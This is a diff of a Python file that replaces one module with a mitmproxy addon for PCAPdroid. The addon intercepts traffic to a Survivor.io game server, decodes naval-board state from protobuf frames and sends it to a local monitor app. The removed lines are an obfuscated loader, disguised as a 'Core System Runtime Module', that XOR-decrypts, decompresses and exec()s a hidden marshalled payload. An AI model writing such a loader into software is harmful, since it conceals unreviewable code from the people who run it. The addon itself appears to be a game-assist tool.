@@ -1,18 +1,146 @@
-# Core System Runtime Module
-import base64 as _b64
-import hashlib as _h256
-import marshal as _msh
-import zlib as _zlib
+"""PCAPdroid-mitm addon for Survivor.io naval-board monitoring.
 
-_K = b"_k8f9a2c41e0b573d90214a1e8f572c63"
-_H = "b468a02bff6fcf1c7b09d8048b14ca6adceba93210e15a9dbc851671226d77e7"
-_P = "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"
+Copy this file to the PCAPdroid-mitm user addon directory and enable it.
+It sends compact JSON state updates to the monitor app at 127.0.0.1:8086.
+"""
 
-if _h256.sha256(_P.encode("ascii")).hexdigest() != _H:
-    raise RuntimeError("Integrity Error")
+from __future__ import annotations
 
-_raw = _b64.b64decode(_P)
-_dec = bytes(b ^ _K[i % len(_K)] for i, b in enumerate(_raw))
-_cobj = _msh.loads(_zlib.decompress(_dec))
+import base64
+import json
+import socket
+import struct
+import time
 
-exec(_cobj, globals())
+
+GAME_HOST = "prod-game.survivorio.com"
+DESTINATION = ("127.0.0.1", 8086)
+STATE = {"board_number": 0, "rows": 0, "cols": 0, "matrix": [], "selected": []}
+
+
+def read_varint(data: bytes, offset: int) -> tuple[int, int]:
+    value = 0
+    shift = 0
+    while offset < len(data) and shift < 70:
+        byte = data[offset]
+        offset += 1
+        value |= (byte & 0x7F) << shift
+        if not byte & 0x80:
+            return value, offset
+        shift += 7
+    raise ValueError("invalid varint")
+
+
+def parse_message(data: bytes) -> dict[int, list[object]]:
+    result: dict[int, list[object]] = {}
+    offset = 0
+    while offset < len(data):
+        tag, offset = read_varint(data, offset)
+        field = tag >> 3
+        wire = tag & 7
+        if wire == 0:
+            value, offset = read_varint(data, offset)
+        elif wire == 2:
+            size, offset = read_varint(data, offset)
+            value = data[offset:offset + size]
+            offset += size
+        elif wire == 1:
+            value = data[offset:offset + 8]
+            offset += 8
+        elif wire == 5:
+            value = data[offset:offset + 4]
+            offset += 4
+        else:
+            raise ValueError("unsupported protobuf wire type")
+        result.setdefault(field, []).append(value)
+    return result
+
+
+def first(fields: dict[int, list[object]], number: int, default=None):
+    return fields.get(number, [default])[0]
+
+
+def decode_frames(data: bytes):
+    for offset in range(max(0, len(data) - 5)):
+        if offset + 6 > len(data):
+            break
+        message_type, payload_size = struct.unpack_from("<HI", data, offset)
+        if not 10000 <= message_type <= 60000 or not 0 < payload_size <= 2_000_000:
+            continue
+        end = offset + 6 + payload_size
+        if end > len(data):
+            continue
+        yield message_type, data[offset + 6:end]
+
+
+def send_state(message_type: int):
+    payload = dict(STATE)
+    payload["type"] = message_type
+    payload["updated_at"] = int(time.time())
+    try:
+        socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(
+            json.dumps(payload, separators=(",", ":")).encode("utf-8"), DESTINATION
+        )
+    except OSError:
+        pass
+
+
+def handle_frame(message_type: int, payload: bytes):
+    fields = parse_message(payload)
+    if message_type == 19702:
+        if update_board_from_config(first(fields, 3, b"")):
+            send_state(message_type)
+    elif message_type == 19709:
+        selected = bytes(first(fields, 2, b""))
+        STATE["selected"] = list(selected)
+        send_state(message_type)
+    elif message_type == 19710:
+        response_bytes = first(fields, 3, b"")
+        # When a board is completed, the next board setup can be embedded
+        # directly in the 19710 response instead of arriving as 19702.
+        if update_board_from_config(response_bytes):
+            send_state(message_type)
+        response = parse_message(response_bytes)
+        selected = bytes(first(response, 11, b""))
+        if selected:
+            STATE["selected"] = list(selected)
+        send_state(message_type)
+
+
+def update_board_from_config(config_bytes: bytes) -> bool:
+    try:
+        config = parse_message(config_bytes)
+        rows = int(first(config, 5, 0))
+        cols = int(first(config, 6, 0))
+        seed = bytes(first(config, 7, b""))
+    except (TypeError, ValueError):
+        return False
+    if rows <= 0 or cols <= 0 or len(seed) != rows * cols:
+        return False
+    if STATE["rows"] == rows and STATE["cols"] == cols and STATE["matrix"] == list(seed):
+        return False
+    STATE.update({
+        "board_number": STATE["board_number"] + 1,
+        "rows": rows,
+        "cols": cols,
+        "matrix": list(seed),
+        "selected": [],
+    })
+    return True
+
+
+class SurvivorNavalAddon:
+    def request(self, flow):
+        if flow.request.pretty_host != GAME_HOST:
+            return
+        for message_type, payload in decode_frames(bytes(flow.request.content or b"")):
+            handle_frame(message_type, payload)
+
+    def response(self, flow):
+        if flow.request.pretty_host != GAME_HOST:
+            return
+        for message_type, payload in decode_frames(bytes(flow.response.content or b"")):
+            handle_frame(message_type, payload)
+
+
+addons = [SurvivorNavalAddon()]
